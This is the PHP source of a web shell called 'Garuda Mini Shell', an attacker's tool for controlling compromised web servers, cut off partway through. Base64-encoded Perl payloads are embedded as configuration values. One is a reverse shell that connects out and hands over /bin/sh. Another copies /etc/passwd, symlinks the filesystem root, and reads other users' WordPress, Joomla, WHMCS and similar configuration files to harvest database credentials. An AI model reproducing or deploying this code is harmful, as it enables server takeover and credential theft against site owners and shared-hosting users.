<?php
/*
	Garuda Mini Shell V.1 ( Reborn )
	Code By : Mr.IN130X
	Jayalah Indonesiaku <3
*/
error_reporting(0);
session_start();
antibot();
magics();
privates();
/*
	Configuration Here
*/
$password = "ae9fa6d4a2de36b4477d0381b9f0b795";	
$GLOBALS['0x']['info'] = "R2FydWRhIE1pbmkgU2hlbGw=";
$GLOBALS['0x']['vk'] = "MS4w";
$GLOBALS['0x']['author'] = "TXIuSU4xMzBYCQ0K";
$GLOBALS['0x']['perlback'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
$GLOBALS['FILEPATH']  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
$GLOBALS['REVERSEIP'] = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
$GLOBALS['0x']['symlinker'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgRmlsZTo6Q29weTsNCnVzZSBzdHJpY3Q7DQp1c2Ugd2FybmluZ3M7DQp1c2UgTUlNRTo6QmFzZTY0Ow0KY29weSgiL2V0Yy9wYXNzd2QiLCJwYXNzd2QudHh0IikgOw0KbWtkaXIgInN5bSI7DQpzeW1saW5rKCIvIiwic3ltL3Jvb3QiKTsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJsZUM1b2RHME5Da0ZrWkZSNWNHVWdkR1Y0ZEM5d2JHRnBiaUF1Y0dod0lBMEtRV1JrU0dGdVpHeGxjaUIwWlhoMEwzQnNZV2x1SUM1d2FIQU5DbE5oZEdselpua2dRVzU1RFFwSmJtUmxlRTl3ZEdsdmJuTWdLME5vWVhKelpYUTlWVlJHTFRnZ0swWmhibU41U1c1a1pYaHBibWNnSzBsbmJtOXlaVU5oYzJVZ0swWnZiR1JsY25OR2FYSnpkQ0FyV0VoVVRVd2dLMGhVVFV4VVlXSnNaU0FyVTNWd2NISmxjM05TZFd4bGN5QXJVM1Z3Y0hKbGMzTkVaWE5qY21sd2RHbHZiaUFyVG1GdFpWZHBaSFJvUFNvZ0RRcEJaR1JKWTI5dUlDZGtZWFJoT21sdFlXZGxMM0J1Wnp0aVlYTmxOalFzYVZaQ1QxSjNNRXRIWjI5QlFVRkJUbE5WYUVWVlowRkJRVUpCUVVGQlFWRkRRVmxCUVVGQlpqZ3ZPV2hCUVVGQlFraE9RMU5XVVVsRFFXZEpaa0ZvYTJsQlFVRkJRV3gzVTBac2VrRkJRVTR4ZDBGQlJHUmpRbEZwYVdKbFFVRkJRVUpzTUZKV2FEQlZNamx0WkVoa2FHTnRWVUZrTTJRelRHMXNkV0V6VG1wWldFSnNURzA1ZVZvMWRuVlFRbTlCUVVGR1ZWTlZVa0pXUkdsT2NGcExPVk5uVGtKR1NWaFFkbGhPYm1ScVkxSnZjRmcwVlRSclYxWnlOVUZEYUZVM1NEaENVMlpKZEVGSWEwSTVRMWh6Y2xjd1IzZEZVWFJTZDFaTFRWSjBRVlU0V21OWlYyRk9iVTB5VDNoeGVYbHBXVnBrWTBkSllWbzBXamMzVFdWbFVXTjNOa1JHUVM5VlJGVkJRVmxJU0dvNGFFOUJWR281YjFKVFpUSmFNV1l5UzJwUU1XWm5UR3R1VFZCVE5XeFhNRlpwTkhCYWIzQjJTRmhFVnl0SmFFOXlPVGxuV0ZSNmEzSTVjWFpVUWsxMGNrNWtPRUZ6VEZaamIyMWFTMFJRTmpGclJVeHBhRWRKU2psUlFtZFBNbXBrYzBsRkwwcGlOVTloWTBkR1FYZEVVVVZsVFVWUFdtNW9NVVZ4VFVOb2RGTkNPR0UyTkVKWE1rMU9hRGRSVm1sb1EwZExZMDVJYzNkdFdqQnNRV3RaU0hoR05GRm9RbEJEUzBsWlVsVTViRFl3TlV0dFIwTkZTVlZaZW5SRFdVMUNabXRGYWtkYU5FOXBTSGRTVVVZcmRtdFJSeXR3ZEVGRFNVWlNSVXBXVUZGQmRrWm1LMEp5YW05NVVTdERXbVp4Y1RFeE9FUlNSa1ZvYW1WaVltSmxiRFprUjJsNVZIRm1LM1pUY210aFVsRXZNSFYwVERkdFNGaHNPWFp4SzJWUU0xVnVZbWd2U0RWblJFdHBUMFkyTjFsbFlsa3daRk5LWTFKQ2JUQjZNbkpHYkRKNVYzQTRRVlpFU1Zjek1tUmhOM0JNUVVGQlFVRkZiRVpVYTFOMVVXMURReWNnWGw1RVNWSkZRMVJQVWxsZVhnMEtSR1ZtWVhWc2RFbGpiMjRnSjJSaGRHRTZhVzFoWjJVdmNHNW5PMkpoYzJVMk5DeHBWa0pQVW5jd1MwZG5iMEZCUVVGT1UxVm9SVlZuUVVGQlFrRkJRVUZCVVVOQldVRkJRVUZtT0M4NWFFRkJRVUZCV0U1VFVqQkpRWEp6TkdNMlVVRkJRVUZhYVZNd1pFVkJVRGhCTDNkRUwyOU1NbTVyZDBGQlFVRnNkMU5HYkhwQlFVRk1SWGRCUVVONFRVSkJTbkZqUjBGQlFVRkJaREJUVlRGR1FqbHZTa0pvWTFSS2RqSkNNbVEwUVVGQlNrMVRWVkpDVmtScVRHSmFUemxVYUhoYVJVbFhMM0ZzZG1SMFRUTTRRazVuU2xGdFVXZEtSMlFyUVM5TlVVSk1kMGRxYVhkSU0yNTNaR3RUVEhSUE1uaEZVa2MxVEhGNFdGSlRTVkl5V1VSbVJEUkhhMGROTUZBemNtSTBZamxRUVhvd2JEZHdVMnhYYkZjd1ptNXVURzlzUVVsUVFqUlFXR2cwWlVaMWJuVmpRVWxKVEhka1JWTmxXbmxCYVdadWNEWXJkVGx2VGt4dk0yZE5NMDU2VkdSSVVpc3ZMM3AyU2sxNlUzbEtTMHR2WkdsSlp6aEJXR0Y0WlVsNk1XSkVXamROZUhGT1puUm5VMVZTUkZkNU4weFZibG93WkZsdGVFRkdRVlpGYkVrMlFVVkRlV2RKYzFGUmMybDZURUpQUVVKQlJFOXFTMEZ3Y1dnM2RUZEhiME5WVjJsM1dXSmxkRzlWU0hKeVVHTjNRM0Z2UmpKTFZXVllUSHBGZWtKMk1DdDFVVzFUU0UxRldqbEdObE5hWTNJMmFUUkpjMEpQWVM5aU4waFJUV0ZJZEVsQmQyZE1aRWhoYkVSQk1XVjJNR1ZSWWxOcWNrVnlVWGRLY0hGR05HVkJlQzlvYjNGRU1UTXliVTFyU25KcE5YVlRUMnhHYUVWb2NGVlJTV2x2YW5kaGJVOUVUbk5zYW1aVlYwTnhjRXh1VDJGaFExTkxTblJ1WVVKRGMxcFpha0ZzYkcxWVNUUjJZV1Z2WVZaWU1HTmlVMlJvYlZWU00zcEJTM1pPYWxrMlZtbHZiekIwVjNwblJXOXVTMkpYSzB0clIxZDBNMVZ1ZERCRFpVZG1Tbk01Wnl0VlZUQnlSVWRJU0M5SWR5OU5ha2cyTDFRclVFOWtSbTlTVGt0RGFFMHlNbmh0VDFCbGMzQnFVRWRSTmtod1RsRXlOM1EyYzBGRFJGTk9ZVzU1YjJ4cVJFeEZaRlpoUms5TVpUaGFhMVZxU3pWMWEzRXpkRGM1YkZCRE55OVBSR3MxUjJFcldUWlBOVTF4ZVcxT2R6TldNWGt6YUhsNlpsZ3dhSEYyU2t4NVlsaEdaQ3NyWmpKa00yUXdaRzF6SzNGMlp6UlBSSG80WmtoNE1DOU1jMkpsTXprMk5ITlROeXMwZFVWcWRXNXdjVzFUWlRabE0wUXpUalV2VGpCWFdtSjBiSGs1WmpBNWJsb3lXaTlpTWpsMk1tWk1SV1YyZGtzNWNYWTNZekowYjB0cE9GVnBhVkZwY1VoaWJUWnlhVmMyWVRFelptNHJlblkzTXl0dmNXOXlhR05NWjB0VlJsaFdVQ3RtYmpVeUsweHZibW80U1V4S01GQTRXa2xEUTBZNUwxQlVjRU5zYUhCQ2RtZFFaV3h2VERsVk5UVk9TVUZCUVVGQlFWTlZWazlTU3pWRFdVbEpQU2NOQ2tsdVpHVjRTV2R1YjNKbElDb3VkSGgwTkRBMERRcFNaWGR5YVhSbFJXNW5hVzVsSUU5dURRcFNaWGR5YVhSbFEyOXVaQ0FsZTFKRlVWVkZVMVJmUmtsTVJVNUJUVVY5SUY0dUtqQjRjM2x0TkRBMElGdE9RMTBOQ2xKbGQzSnBkR1ZTZFd4bElGd3VkSGgwSkNBbGUxSkZVVlZGVTFSZlZWSkpmVFF3TkNCYlRDeFNQVE13TWk1T1ExMD0iKTsNCm15ICRzeW0gPSBkZWNvZGVfYmFzZTY0KCJUM0IwYVc5dWN5QkpibVJsZUdWeklFWnZiR3h2ZDFONWJVeHBibXR6RFFwRWFYSmxZM1J2Y25sSmJtUmxlQ0JwYm1SbGVDNW9kRzBOQ2tobFlXUmxjazVoYldVZ01IZ3hPVGs1TG5SNGRBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QkpaMjV2Y21WRFlYTmxJRVpoYm1ONVNXNWtaWGhwYm1jZ1JtOXNaR1Z5YzBacGNuTjBJRTVoYldWWGFXUjBhRDBxSUVSbGMyTnlhWEIwYVc5dVYybGtkR2c5S2lCVGRYQndjbVZ6YzBoVVRVeFFjbVZoYldKc1pRMEtTVzVrWlhoSloyNXZjbVVnS2c9PSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdzeW0vLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoMTsNCm9wZW4obXkgJHh4LCAnPicsICdzeW0vbmVtdS50eHQnKTsNCnByaW50ICR4eCAiJHN5bSI7DQpjbG9zZSAkeHg7DQpvcGVuKG15ICRmaCwgJzw6ZW5jb2RpbmcoVVRGLTgpJywgJGZpbGVuYW1lKTsNCndoaWxlIChteSAkcm93ID0gPCRmaD4pIHsNCm15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsNCm15ICR1c2VybnlhID0gJDE7DQpteSBAYXJyYXkgPSAoDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nLy5hY2Nlc3NoYXNoJywgdHlwZSA9PiAnV0hNLWFjY2Vzc2hhc2gnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hcHAvZXRjL2xvY2FsLnhtbCcsIHR5cGUgPT4gJ01hZ2VudG8nIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCB0eXBlID0+ICdPcGVuQ2FydCcgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wb3J0YWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XUC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kZW1vL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC90ZXN0L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjIvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzMS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnRlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW4vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Ib3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DQVJUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PUkRFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRBUkVBL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CSUxMSU5HL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CVVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdX